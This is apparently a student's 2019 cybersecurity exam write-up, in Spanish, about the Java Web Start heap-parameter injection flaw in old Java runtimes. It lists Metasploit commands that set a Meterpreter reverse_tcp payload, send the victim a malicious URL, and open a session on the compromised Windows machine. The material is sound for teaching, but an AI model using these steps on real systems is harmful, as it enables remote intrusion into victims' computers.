# ParcialCiber
Parcial ciberseguridad 2019

exploit/windows/browser/java_ws_double_quote
==============================================

Explicación vulnerabilidad:
----------------------------

Esta vulnerabilidad consiste en explotar los parametros
initial-heap-size y max-heap-size que se encuentran en el
archivo JNPL que utiliza el Java Web Start para descargar, instalar y
ejecutar cualquier aplicación, estos parametros no se encuentran
adecuadamente establecidos entonces se les puede añadir un
archivo jvm.dll que se cargará cuando se ejecute el javaw.exe
en Windows y podra obtener información de la maquina atacada
remotamente dada desde el mismo navegador de la victima.

Esta vulnerabilidad se soluciono en 2012 y afecta a las versiones
de Java Run Enviroment menores o igual a la 1.6.35.

Sistema operativo:
-------------------

Este ataque se puede hacer desde una maquina Kali Linux y esta
dirigido al sistema operativo Windows (Victima).

El software para hacer el ataque (explotar las vulnerabilidades)
que utilice es Metasploit.

Instructivo:
-------------

Se ejecutan los siguientes comandos dentro del Metasploit:

use exploit/windows/browser/java_ws_double_quote (para usar
este modulo de vulnerabilidad ya encontrada)

ifconfig (para saber nuestra ip)

set SRVHOST 10.191.8.4 (para establecer la dirección ip del servidor,
 en este caso servidor local a utilizar para el ataque)

set PAYLOAD windows/meterpreter/reverse_tcp (subimos el código
que se activará para aprovechar la vulnerabilidad)

set LHOST 10.191.8.4  (para establecer donde recibiremos los datos
del pc atacado)

exploit (ejecutar el exploit, vulnerabilidad)

Luego nos mostrará un using URL que es la ip que debemos compartir
a la victima para hacer el ataque.

sessions -l (lista las sesiones activas de las victimas)

sessions -i 1 (seleccionar sesion de la maquina atacada)

sysinfo (visualizar informacion de la maquina atacada)
